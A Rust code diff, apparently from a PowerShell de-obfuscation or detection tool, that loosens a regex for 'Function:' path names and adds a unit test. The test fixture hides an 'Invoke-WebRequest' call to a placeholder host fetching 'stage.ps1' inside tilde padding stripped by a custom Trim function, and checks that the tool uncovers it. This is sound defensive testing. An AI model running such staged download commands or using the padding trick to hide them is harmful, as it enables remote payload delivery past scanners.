@@ -969,7 +969,7 @@ static PS_ITEM_FUNCTION_NAME_RE: Lazy<Regex> = Lazy::new(|| {
 #[allow(clippy::expect_used)]
 static PS_ITEM_FUNCTION_PATH_NAME_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?i)(?:^|[\s,;])(?:-(?:p|path)\s+)?['"]?function:[\\/]+([A-Za-z_][A-Za-z0-9_]*(?:-[A-Za-z0-9_]+)*)['"]?"#,
+        r#"(?i)(?:^|[\s,;])(?:-(?:p|path)\s+)?['"]?function:[\\/]*([A-Za-z_][A-Za-z0-9_]*(?:-[A-Za-z0-9_]+)*)['"]?"#,
     )
     .expect("ps item function path-name regex")
 });
@@ -7330,6 +7330,24 @@ Clean '~~~Invoke-WebRequest -Uri https://ps-new-item-path-function-extractor.exa
                 "'Invoke-WebRequest -Uri https://ps-new-item-path-function-extractor.example/stage.ps1'"
             ),
             "New-Item function path-name trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_new_item_compact_function_path_name_trim_extractor_call_is_rewritten() {
+        let text = r#"(New-Item Function:Clean -Value {
+  param($value,$chars)
+  return $value.Trim($chars)
+});
+Clean '~~~Invoke-WebRequest -Uri https://ps-compact-function-extractor.example/stage.ps1~~~' '~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-compact-function-extractor.example/stage.ps1'"
+            ),
+            "compact function path-name trim extractor call was not rewritten:\n{out}"
         );
     }
 
